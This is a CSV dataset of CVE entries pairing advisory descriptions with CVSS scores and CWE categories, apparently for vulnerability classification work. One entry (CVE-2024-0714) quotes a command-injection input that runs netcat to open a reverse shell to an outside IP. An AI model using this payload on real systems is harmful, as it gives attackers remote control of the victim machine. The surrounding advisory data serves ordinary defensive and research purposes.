CVE,Description,CVSS3_BaseScore,CWE
CVE-2024-46750,In the Linux kernel the following vulnerability has been resolved:  PCI: Add missing bridge lock to pci_bus_lock()  One of the true positives that the cfg_access_lock lockdep effort identified is this sequence:    WARNING: CPU: 14 PID: 1 at drivers/pci/pci.c:4886 pci_bridge_secondary_bus_reset+0x5d/0x70   RIP: 0010:pci_bridge_secondary_bus_reset+0x5d/0x70   Call Trace:    <TASK>    ? __warn+0x8c/0x190    ? pci_bridge_secondary_bus_reset+0x5d/0x70    ? report_bug+0x1f8/0x200    ? handle_bug+0x3c/0x70    ? exc_invalid_op+0x18/0x70    ? asm_exc_invalid_op+0x1a/0x20    ? pci_bridge_secondary_bus_reset+0x5d/0x70    pci_reset_bus+0x1d8/0x270    vmd_probe+0x778/0xa10    pci_device_probe+0x95/0x120  Where pci_reset_bus() users are triggering unlocked secondary bus resets. Ironically pci_bus_reset() several calls down from pci_reset_bus() uses pci_bus_lock() before issuing the reset which locks everything *but* the bridge itself.  For the same motivation as adding:    bridge = pci_upstream_bridge(dev);   if (bridge)     pci_dev_lock(bridge);  to pci_reset_function() for the bus and cxl_bus reset cases add pci_dev_lock() for @bus->self to pci_bus_lock().  [bhelgaas: squash in recursive locking deadlock fix from Keith Busch: https://lore.kernel.org/r/20240711193650.701834-1-kbusch@meta.com],5.5,CWE-667
CVE-2024-11757,The WP GeoNames plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's 'wp-geonames' shortcode in all versions up to and including 1.9.0.1 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level access and above to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.,6.4,CWE-79
CVE-2022-21882,Win32k Elevation of Privilege Vulnerability,7.0,CWE-787
CVE-2019-19705,Realtek Audio Drivers for Windows as used on the Lenovo ThinkPad X1 Carbon 20A7 20A8 20BS and 20BT before 6.0.8882.1 and 20KH and 20KG before 6.0.8907.1 (and on many other Lenovo and non-Lenovo products) mishandles DLL preloading.,7.8,CWE-428
CVE-2024-20506,A vulnerability in the ClamD service module of Clam AntiVirus (ClamAV) versions 1.4.0 1.3.2 and prior versions all 1.2.x versions 1.0.6 and prior versions all 0.105.x versions all 0.104.x versions and 0.103.11 and all prior versions could allow an authenticated local attacker to corrupt critical system files.    The vulnerability is due to allowing the ClamD process to write to its log file while privileged without checking if the logfile has been replaced with a symbolic link. An attacker could exploit this vulnerability if they replace the ClamD log file with a symlink to a critical system file and then find a way to restart the ClamD process. An exploit could allow the attacker to corrupt a critical system file by appending ClamD log messages after restart.,6.1,CWE-754
CVE-2024-39018,harvey-woo cat5th/key-serializer v0.2.5 was discovered to contain a prototype pollution via the function query. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.,6.3,CWE-1321
CVE-2025-4043,An admin user can gain unauthorized write access to the /etc/rc.local file on the device which is executed on a system boot.,6.8,CWE-1274
CVE-2023-26326,The BuddyForms WordPress plugin in versions prior to 2.7.8 was affected by an unauthenticated insecure deserialization issue. An unauthenticated attacker could leverage this issue to call files using a PHAR wrapper that will deserialize the data and call arbitrary PHP Objects that can be used to perform a variety of malicious actions granted a POP chain is also present.,9.8,CWE-502
CVE-2022-23431,An improper boundary check in RPMB ldfw prior to SMR Feb-2022 Release 1 allows arbitrary memory write and code execution.,6.4,CWE-120
CVE-2024-11745,A vulnerability was found in Tenda AC8 16.03.34.09 and classified as critical. Affected by this issue is the function route_static_check of the file /goform/SetStaticRouteCfg. The manipulation of the argument list leads to stack-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.,8.8,CWE-119
CVE-2022-35875,Four format string injection vulnerabilities exist in the XCMD testWifiAP functionality of Abode Systems Inc. iota All-In-One Security Kit 6.9X and 6.9Z. Specially-crafted configuration values can lead to memory corruption information disclosure and denial of service. An attacker can modify a configuration value and then execute an XCMD to trigger these vulnerabilities.This vulnerability arises from format string injection via the `wpapsk` configuration parameter as used within the `testWifiAP` XCMD handler,9.8,CWE-134
CVE-2024-46672,In the Linux kernel the following vulnerability has been resolved:  wifi: brcmfmac: cfg80211: Handle SSID based pmksa deletion  wpa_supplicant 2.11 sends since 1efdba5fdc2c (Handle PMKSA flush in the driver for SAE/OWE offload cases) SSID based PMKSA del commands. brcmfmac is not prepared and tries to dereference the NULL bssid and pmkid pointers in cfg80211_pmksa. PMKID_V3 operations support SSID based updates so copy the SSID.,5.5,CWE-476
CVE-2024-40460,An issue in Ocuco Innovation v.2.10.24.51 allows a local attacker to escalate privileges via the JOBENTRY.EXE,7.8,CWE-269
CVE-2023-49091,Cosmos provides users the ability self-host a home server by acting as a secure gateway to your application as well as a server manager. Cosmos-server is vulnerable due to to the authorization header used for user login remaining valid and not expiring after log out. This vulnerability allows an attacker to use the token to gain unauthorized access to the application/system even after the user has logged out. This issue has been patched in version 0.13.1.,8.8,CWE-613
CVE-2021-42521,There is a NULL pointer dereference vulnerability in VTK before 9.2.5 and it lies in IO/Infovis/vtkXMLTreeReader.cxx. The vendor didn't check the return value of libxml2 API 'xmlDocGetRootElement' and try to dereference it. It is unsafe as the return value can be NULL and that NULL pointer dereference may crash the application.,7.5,CWE-400
CVE-2023-1634,A vulnerability was found in OTCMS 6.72. It has been classified as critical. Affected is the function UseCurl of the file /admin/info_deal.php of the component URL Parameter Handler. The manipulation leads to server-side request forgery. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-224016.,6.3,CWE-918
CVE-2024-11432,The SuevaFree Essential Kit plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's 'counter' shortcode in all versions up to and including 1.1.3 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level access and above to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.,6.4,CWE-79
CVE-2023-31717,A SQL Injection attack in FUXA <= 1.1.12 allows exfiltration of confidential information from the database.,7.5,CWE-89
CVE-2020-36841,The WooCommerce Smart Coupons plugin for WordPress is vulnerable to authorization bypass due to a missing capability check on the woocommerce_coupon_admin_init function in versions up to and including 4.6.0. This makes it possible for unauthenticated attackers to send themselves gift certificates of any value which could be redeemed for products sold on the victim’s storefront.,5.3,CWE-285
CVE-2024-8803,The Bulk NoIndex & NoFollow Toolkit plugin for WordPress is vulnerable to Reflected Cross-Site Scripting due to the use of remove_query_arg without appropriate escaping on the URL in all versions up to and including 2.15. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link.,6.1,CWE-79
CVE-2024-58093,In the Linux kernel the following vulnerability has been resolved:  PCI/ASPM: Fix link state exit during switch upstream function removal  Before 456d8aa37d0f (PCI/ASPM: Disable ASPM on MFD function removal to avoid use-after-free) we would free the ASPM link only after the last function on the bus pertaining to the given link was removed.  That was too late. If function 0 is removed before sibling function link->downstream would point to free'd memory after.  After above change we freed the ASPM parent link state upon any function removal on the bus pertaining to a given link.  That is too early. If the link is to a PCIe switch with MFD on the upstream port then removing functions other than 0 first would free a link which still remains parent_link to the remaining downstream ports.  The resulting GPFs are especially frequent during hot-unplug because pciehp removes devices on the link bus in reverse order.  On that switch function 0 is the virtual P2P bridge to the internal bus. Free exactly when function 0 is removed -- before the parent link is obsolete but after all subordinate links are gone.  [kwilczynski: commit log],7.8,CWE-416
CVE-2024-26036,Adobe Experience Manager versions 6.5.20 and earlier are affected by a stored Cross-Site Scripting (XSS) vulnerability that could be abused by an attacker to inject malicious scripts into vulnerable form fields. Malicious JavaScript may be executed in a victim’s browser when they browse to the page containing the vulnerable field.,5.4,CWE-79
CVE-2023-2385,A vulnerability was found in Netgear SRX5308 up to 4.3.5-3. It has been rated as problematic. This issue affects some unknown processing of the file scgi-bin/platform.cgi?page=ike_policies.htm of the component Web Management Interface. The manipulation of the argument IpsecIKEPolicy.IKEPolicyName leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-227663. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.,2.4,CWE-79
CVE-2023-39457,Triangle MicroWorks SCADA Data Gateway Missing Authentication Vulnerability. This vulnerability allows remote attackers to bypass authentication on affected installations of Triangle MicroWorks SCADA Data Gateway. Authentication is not required to exploit this vulnerability.  The specific flaw exists due to the lack of user authentication. The issue results from missing authentication in the default system configuration. An attacker can leverage this vulnerability to execute arbitrary code in the context of root. Was ZDI-CAN-20501.,9.8,CWE-306
CVE-2025-20727,In Modem there is a possible out of bounds write due to a heap buffer overflow. This could lead to remote escalation of privilege if a UE has connected to a rogue base station controlled by the attacker with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: MOLY01672601; Issue ID: MSV-4623.,7.5,CWE-787
CVE-2022-29482,'Mobaoku-Auction&Flea Market' App for iOS versions prior to 5.5.16 improperly verifies server certificates which may allow an attacker to eavesdrop on an encrypted communication via a man-in-the-middle attack.,3.7,CWE-295
CVE-2024-21329,Azure Connected Machine Agent Elevation of Privilege Vulnerability,7.3,CWE-59
CVE-2024-12864,A Denial of Service (DoS) vulnerability was discovered in the file upload feature of netease-youdao/qanything version v2.0.0. The vulnerability is due to improper handling of form-data with a large filename in the file upload request. An attacker can exploit this vulnerability by sending a large filename causing the server to become overwhelmed and unavailable for legitimate users. This attack does not require authentication making it highly scalable and increasing the risk of exploitation.,7.5,CWE-400
CVE-2024-5686,The WPZOOM Addons for Elementor (Templates Widgets) plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the ‘url’ attribute within the plugin's Team Members widget in all versions up to and including 1.1.38 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers with Contributor-level access and above to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.,6.4,CWE-79
CVE-2024-53713,Cross-Site Request Forgery (CSRF) vulnerability in Alain Diart for les-sushi-codeurs.fr & Eric Ambrosi for regart.net Silverlight Video Player allows Stored XSS.This issue affects Silverlight Video Player: from n/a through 1.0.,7.1,CWE-352
CVE-2025-0299,A vulnerability classified as critical has been found in code-projects Online Book Shop 1.0. Affected is an unknown function of the file /search_result.php. The manipulation of the argument s leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.,6.3,CWE-74
CVE-2023-0134,Use after free in Cart in Google Chrome prior to 109.0.5414.74 allowed an attacker who convinced a user to install a malicious extension to potentially exploit heap corruption via database corruption and a crafted HTML page. (Chromium security severity: Medium),8.8,CWE-416
CVE-2022-46137,AeroCMS v0.0.1 is vulnerable to Directory Traversal. The impact is: obtain sensitive information (remote). The component is: AeroCMS v0.0.1.,7.5,CWE-22
CVE-2024-3613,A vulnerability was found in SourceCodester Warehouse Management System 1.0. It has been rated as problematic. Affected by this issue is some unknown functionality of the file supplier.php. The manipulation of the argument nama_supplier/alamat_supplier/notelp_supplier leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-260270 is the identifier assigned to this vulnerability.,3.5,CWE-79
CVE-2023-34335,AMI BMC contains a vulnerability in the IPMI handler where an unauthenticated host is allowed to write to a host SPI flash bypassing secure boot protections. An exploitation of this vulnerability may lead to a loss of integrity or denial of service.               ,7.7,CWE-288
CVE-2024-2892,A vulnerability has been found in Tenda AC7 15.03.06.44 and classified as critical. Affected by this vulnerability is the function formSetCfm of the file /goform/setcfm. The manipulation of the argument funcpara1 leads to stack-based buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-257935. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.,8.8,CWE-121
CVE-2024-37172,SAP S/4HANA Finance (Advanced Payment Management) does not perform necessary authorization check for an authenticated user resulting in escalation of privileges. As a result it has a low impact to confidentiality and availability but there is no impact on the integrity.,5.4,CWE-862
CVE-2022-38027,Windows Storage Elevation of Privilege Vulnerability,7.0,CWE-362
CVE-2023-51499,Missing Authorization vulnerability in WooCommerce WooCommerce Shipping Per Product.This issue affects WooCommerce Shipping Per Product: from n/a through 2.5.4.  ,4.3,CWE-862
CVE-2022-49498,In the Linux kernel the following vulnerability has been resolved:  ALSA: pcm: Check for null pointer of pointer substream before dereferencing it  Pointer substream is being dereferenced on the assignment of pointer card before substream is being null checked with the macro PCM_RUNTIME_CHECK. Although PCM_RUNTIME_CHECK calls BUG_ON it still is useful to perform the the pointer check before card is assigned.,5.5,CWE-476
CVE-2025-46745,An authenticated user without user-management permissions could view other users account information.,6.5,CWE-862
CVE-2023-3716,Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Oduyo Online Collection Software allows SQL Injection.This issue affects Online Collection Software: before 1.0.1.  ,9.8,CWE-89
CVE-2023-25904,Adobe Dimension versions 3.4.7 (and earlier) is affected by an out-of-bounds read vulnerability when parsing a crafted file which could result in a read past the end of an allocated memory structure. An attacker could leverage this vulnerability to execute code in the context of the current user. Exploitation of this issue requires user interaction in that a victim must open a malicious file.,7.8,CWE-125
CVE-2024-10462,Truncation of a long URL could have allowed origin spoofing in a permission prompt. This vulnerability affects Firefox < 132 Firefox ESR < 128.4 Thunderbird < 128.4 and Thunderbird < 132.,6.5,CWE-290
CVE-2024-51886,Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Takashi Matsuyama Posts Filter allows Stored XSS.This issue affects Posts Filter: from n/a through 1.3.1.,6.5,CWE-79
CVE-2023-6391,The Custom User CSS WordPress plugin through 0.2 does not have CSRF check in place when updating its settings which could allow attackers to make a logged in admin change them via a CSRF attack.,8.8,CWE-352
CVE-2023-1583,A NULL pointer dereference was found in io_file_bitmap_get in io_uring/filetable.c in the io_uring sub-component in the Linux Kernel. When fixed files are unregistered some context information (file_alloc_{startend} and alloc_hint) is not cleared. A subsequent request that has auto index selection enabled via IORING_FILE_INDEX_ALLOC can cause a NULL pointer dereference. An unprivileged user can use the flaw to cause a system crash.,5.5,CWE-476
CVE-2025-5495,A vulnerability was found in Netgear WNR614 1.1.0.28_1.0.1WW. It has been classified as critical. This affects an unknown part of the component URL Handler. The manipulation with the input %00currentsetting.htm leads to improper authentication. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. This issue appears to have been circulating as an 0day since 2024.,7.3,CWE-287
CVE-2023-6109,The YOP Poll plugin for WordPress is vulnerable to a race condition in all versions up to and including 6.5.26. This is due to improper restrictions on the add() function. This makes it possible for unauthenticated attackers to place multiple votes on a single poll even when the poll is set to one vote per person.,5.3,CWE-362
CVE-2025-32213,Missing Authorization vulnerability in flothemesplugins Flo Forms allows Exploiting Incorrectly Configured Access Control Security Levels. This issue affects Flo Forms: from n/a through 1.0.43.,6.5,CWE-862
CVE-2022-41331,A missing authentication for critical function vulnerability [CWE-306] in FortiPresence infrastructure server before version 1.2.1 allows a remote unauthenticated attacker to access the Redis and MongoDB instances via crafted authentication requests.,9.8,CWE-306
CVE-2021-47248,In the Linux kernel the following vulnerability has been resolved:  udp: fix race between close() and udp_abort()  Kaustubh reported and diagnosed a panic in udp_lib_lookup(). The root cause is udp_abort() racing with close(). Both racing functions acquire the socket lock but udp{v6}_destroy_sock() release it before performing destructive actions.  We can't easily extend the socket lock scope to avoid the race instead use the SOCK_DEAD flag to prevent udp_abort from doing any action when the critical race happens.  Diagnosed-and-tested-by: Kaustubh Pandey <kapandey@codeaurora.org>,4.7,CWE-362
CVE-2023-3631,Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Medart Health Services Medart Notification Panel allows SQL Injection.This issue affects Medart Notification Panel: through 20231123.   NOTE: The vendor was contacted early about this disclosure but did not respond in any way.    ,9.8,CWE-89
CVE-2023-2788,Mattermost fails to check if an admin user account active after an oauth2 flow is started allowing an attacker with admin privileges to retain persistent access to Mattermost by obtaining an oauth2 access token while the attacker's account is deactivated.  ,6.2,CWE-862
CVE-2022-0671,A flaw was found in vscode-xml in versions prior to 0.19.0. Schema download could lead to blind SSRF or DoS via a large file.,9.1,CWE-918
CVE-2024-1809,The Analytify – Google Analytics Dashboard For WordPress (GA4 analytics made easy) plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on AJAX functions in combination with nonce leakage in all versions up to and including 5.2.3. This makes it possible for authenticated attackers with subscriber access and higher to obtain certain sensitive information related to plugin settings.,5.4,CWE-862
CVE-2024-20282,A vulnerability in Cisco Nexus Dashboard could allow an authenticated local attacker with valid rescue-user credentials to elevate privileges to root on an affected device.    This vulnerability is due to insufficient protections for a sensitive access token. An attacker could exploit this vulnerability by using this token to access resources within the device infrastructure. A successful exploit could allow an attacker to gain root access to the filesystem or hosted containers on an affected device.,6.0,CWE-269
CVE-2024-0534,A vulnerability classified as critical has been found in Tenda A15 15.13.07.13. Affected is an unknown function of the file /goform/SetOnlineDevName of the component Web-based Management Interface. The manipulation of the argument mac leads to stack-based buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-250704. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.,7.2,CWE-121
CVE-2024-0714,A vulnerability was found in MiczFlor RPi-Jukebox-RFID up to 2.5.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file userScripts.php of the component HTTP Request Handler. The manipulation of the argument folder with the input ;nc 104.236.1.147 4444 -e /bin/bash; leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251540. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.,6.3,CWE-78
CVE-2022-38916,A file upload vulnerability exists in the storage feature of pagekit 1.0.18 which allows an attacker to upload malicious files,9.8,CWE-434
CVE-2025-28381,A credential leak in OpenC3 COSMOS before v6.0.2 allows attackers to access service credentials as environment variables stored in all containers.,7.5,CWE-526
CVE-2025-20279,A vulnerability in the web-based management interface of Cisco Unified CCX could allow an authenticated remote attacker to conduct a stored XSS attack on an affected system. To exploit this vulnerability the attacker must have valid administrative credentials.    This vulnerability is due to improper sanitization of user input to the web-based management interface. An attacker could exploit this vulnerability by submitting a malicious script through the interface. A successful exploit could allow the attacker to conduct a stored XSS attack on the affected system.,4.8,CWE-79
CVE-2024-51588,Improper Neutralization of Input During Web Page Generation (XSS or 'Cross-site Scripting') vulnerability in Themehat Super Addons for Elementor allows DOM-Based XSS.This issue affects Super Addons for Elementor: from n/a through 1.0.,6.5,CWE-79
CVE-2021-27862,Layer 2 network filtering capabilities such as IPv6 RA guard can be bypassed using LLC/SNAP headers with invalid length and Ethernet to Wifi frame conversion (and optionally VLAN0 headers).,4.7,CWE-130
CVE-2021-46895,Vulnerability of defects introduced in the design process in the Multi-Device Task Center. Successful exploitation of this vulnerability will cause the hopped app to bypass the app lock and reset the device that initiates the hop.,9.1,CWE-701
CVE-2024-3537,A vulnerability was found in Campcodes Church Management System 1.0 and classified as critical. This issue affects some unknown processing of the file /admin/admin_user.php. The manipulation of the argument firstname leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-259907.,6.3,CWE-89
CVE-2021-40780,Adobe Media Encoder version 15.4.1 (and earlier) is affected by a memory corruption vulnerability due to insecure handling of a malicious file potentially resulting in arbitrary code execution in the context of the current user. User interaction is required to exploit this vulnerability.,7.8,CWE-788
CVE-2025-49991,Missing Authorization vulnerability in tggfref WP-Recall allows Accessing Functionality Not Properly Constrained by ACLs. This issue affects WP-Recall: from n/a through 16.26.14.,5.3,CWE-862
CVE-2022-20007,In startActivityForAttachedApplicationIfNeeded of RootWindowContainer.java there is a possible way to overlay an app that believes it's still in the foreground when it is not due to a race condition. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-211481342,7.0,CWE-362
CVE-2024-45373,Once logged in to ProGauge MAGLINK LX4 CONSOLE a valid user can change their privileges to administrator.,8.8,CWE-269
CVE-2023-32154,Mikrotik RouterOS RADVD Out-Of-Bounds Write Remote Code Execution Vulnerability. This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of Mikrotik RouterOS. Authentication is not required to exploit this vulnerability.  The specific flaw exists within the Router Advertisement Daemon. The issue results from the lack of proper validation of user-supplied data which can result in a write past the end of an allocated buffer. An attacker can leverage this vulnerability to execute code in the context of root. . Was ZDI-CAN-19797.,7.5,CWE-787
